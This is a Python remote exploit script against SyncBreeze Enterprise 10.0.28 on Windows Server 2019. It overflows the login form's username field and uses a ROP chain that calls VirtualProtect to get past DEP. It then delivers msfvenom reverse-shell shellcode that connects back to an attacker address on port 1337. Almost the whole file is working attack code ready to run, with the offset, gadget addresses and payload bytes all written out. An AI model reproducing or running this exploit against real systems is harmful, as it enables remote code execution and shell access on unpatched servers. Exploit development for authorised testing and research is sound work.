################################################################################
"""
Full title:         SyncBreeze Enterprise DEP Bypass
Exploit Author:     Jacopo Talamini
Tested on version:  10.0.28
Tested on:          Windows Server 2019 Version 1809 Build 17763.737
Category:           remote exploit
Platform:           windows
"""
################################################################################

import socket
import sys
from struct import pack

try:
    server = sys.argv[1]
    port = 80
    offset = 780

    buf = b""
    buf += b"A"*offset

    '''
    VirtualProtect address:
    
    !dh -f 10000000 (libspp.dll)
    dps 10000000+168000 10000000+168000+60C
    10168034  752cb0a0 KERNEL32!QueryDosDeviceA
    !dh -f 75270000 (kernel32.dll)
    dps 75270000+80AD0 75270000+80AD0+14B4
    752f12f8  76cf9990 KERNELBASE!VirtualProtect
    VirtualProtect: u poi(poi(10168034)+ 00026258)
    '''

    rop_chain = [
        ### ECX = ptr to lpflOldProtect (writable address)
        0x10154112, # 0x10154112: push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;
        0x42424242, # junk
        0x101324c5, # 0x101324c5: mov eax, esi ; pop esi ; ret  ;
        0x42424242, # junk
        0x100baecb, # 0x100baecb: xchg eax, ecx ; ret  ;
        ### EDI = ROP NOP
        0x1012e6de, # 0x1012e6de: pop edi ; ret  ;
        0x10010f18, # 0x10010f18: ret  ;
        ### ESI = VirtualProtect
        ### EBP = JMP ESP
        0x1012b413, # 0x1012b413: pop eax ; ret  ;
        0x10168034, # 10168034  752cb0a0 KERNEL32!QueryDosDeviceA
        0x1014dc4c, # 0x1014dc4c: mov eax, dword [eax] ; ret  ;
        0x101548ca, # 0x101548ca: pop ebp ; ret  ;
        0xfffd9da8, # -0x26258
        0x1014c190, # 0x1014c190: sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret  ;
        0x42424242, # esi
        0x10138c27, # 0x10138c27: push esp ; ret  ;
        0xffffffff, # -0x1
        0x1014dc4c, # 0x1014dc4c: mov eax, dword [eax] ; ret  ;
        0x1003f2d7, # 0x1003f2d7: inc esi ; push eax ; mov eax, 0x00000001 ; pop esi ; ret  ;
        ### EBX = dwSize (0x1)
        0x100c9be1, # 0x100c9be1: add ebx, eax ; mov eax, 0x00000001 ; ret  ;
        0x100c9be1, # 0x100c9be1: add ebx, eax ; mov eax, 0x00000001 ; ret  ;
        ### EDX = flNewProtect (0x40)
        0x1012b413, # 0x1012b413: pop eax ; ret  ;
        0xffffffc0, # -0x40
        0x10104df6, # 0x10104df6: neg eax ; ret  ;
        0x100cb4d4, # 0x100cb4d4: xchg eax, edx ; ret  ; <-- mettere gia 90909090 in edx
        ### EAX = ROP NOP
        0x1012b413, # 0x1012b413: pop eax ; ret  ;
        0x90909090, # ROP NOP
        ### PUSHAD
        # registers pushed onto the stack: EDI ESI EBP ESP EBX EDX ECX EAX
        0x10118e8d, # 0x10118e8d: pushad  ; ret  ;
    ]
    buf += b''.join(pack('<L', _) for _ in rop_chain)
    
    # stack adjustment
    buf += b"\x81\xc4\x24\xfa\xff\xff"
    # shellcode
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.57 LPORT=1337 -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
    shellcode =  b""
    shellcode += b"\xd9\xe8\xbf\x0c\x5f\x9a\x1c\xd9\x74\x24\xf4"
    shellcode += b"\x5a\x31\xc9\xb1\x52\x83\xc2\x04\x31\x7a\x13"
    shellcode += b"\x03\x76\x4c\x78\xe9\x7a\x9a\xfe\x12\x82\x5b"
    shellcode += b"\x9f\x9b\x67\x6a\x9f\xf8\xec\xdd\x2f\x8a\xa0"
    shellcode += b"\xd1\xc4\xde\x50\x61\xa8\xf6\x57\xc2\x07\x21"
    shellcode += b"\x56\xd3\x34\x11\xf9\x57\x47\x46\xd9\x66\x88"
    shellcode += b"\x9b\x18\xae\xf5\x56\x48\x67\x71\xc4\x7c\x0c"
    shellcode += b"\xcf\xd5\xf7\x5e\xc1\x5d\xe4\x17\xe0\x4c\xbb"
    shellcode += b"\x2c\xbb\x4e\x3a\xe0\xb7\xc6\x24\xe5\xf2\x91"
    shellcode += b"\xdf\xdd\x89\x23\x09\x2c\x71\x8f\x74\x80\x80"
    shellcode += b"\xd1\xb1\x27\x7b\xa4\xcb\x5b\x06\xbf\x08\x21"
    shellcode += b"\xdc\x4a\x8a\x81\x97\xed\x76\x33\x7b\x6b\xfd"
    shellcode += b"\x3f\x30\xff\x59\x5c\xc7\x2c\xd2\x58\x4c\xd3"
    shellcode += b"\x34\xe9\x16\xf0\x90\xb1\xcd\x99\x81\x1f\xa3"
    shellcode += b"\xa6\xd1\xff\x1c\x03\x9a\x12\x48\x3e\xc1\x7a"
    shellcode += b"\xbd\x73\xf9\x7a\xa9\x04\x8a\x48\x76\xbf\x04"
    shellcode += b"\xe1\xff\x19\xd3\x06\x2a\xdd\x4b\xf9\xd5\x1e"
    shellcode += b"\x42\x3e\x81\x4e\xfc\x97\xaa\x04\xfc\x18\x7f"
    shellcode += b"\x8a\xac\xb6\xd0\x6b\x1c\x77\x81\x03\x76\x78"
    shellcode += b"\xfe\x34\x79\x52\x97\xdf\x80\x35\x58\xb7\xbb"
    shellcode += b"\xfc\x30\xca\xbb\xfb\xf9\x43\x5d\x69\xea\x05"
    shellcode += b"\xf6\x06\x93\x0f\x8c\xb7\x5c\x9a\xe9\xf8\xd7"
    shellcode += b"\x29\x0e\xb6\x1f\x47\x1c\x2f\xd0\x12\x7e\xe6"
    shellcode += b"\xef\x88\x16\x64\x7d\x57\xe6\xe3\x9e\xc0\xb1"
    shellcode += b"\xa4\x51\x19\x57\x59\xcb\xb3\x45\xa0\x8d\xfc"
    shellcode += b"\xcd\x7f\x6e\x02\xcc\xf2\xca\x20\xde\xca\xd3"
    shellcode += b"\x6c\x8a\x82\x85\x3a\x64\x65\x7c\x8d\xde\x3f"
    shellcode += b"\xd3\x47\xb6\xc6\x1f\x58\xc0\xc6\x75\x2e\x2c"
    shellcode += b"\x76\x20\x77\x53\xb7\xa4\x7f\x2c\xa5\x54\x7f"
    shellcode += b"\xe7\x6d\x64\xca\xa5\xc4\xed\x93\x3c\x55\x70"
    shellcode += b"\x24\xeb\x9a\x8d\xa7\x19\x63\x6a\xb7\x68\x66"
    shellcode += b"\x36\x7f\x81\x1a\x27\xea\xa5\x89\x48\x3f"

    buf += shellcode

    content = b"username=" + buf + b"&password=A"
    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://10.11.0.22/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content
    print("[!] Sending payload")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()
    print("[+] Payload sent")
except socket.error:
    print("[-] Connection error")
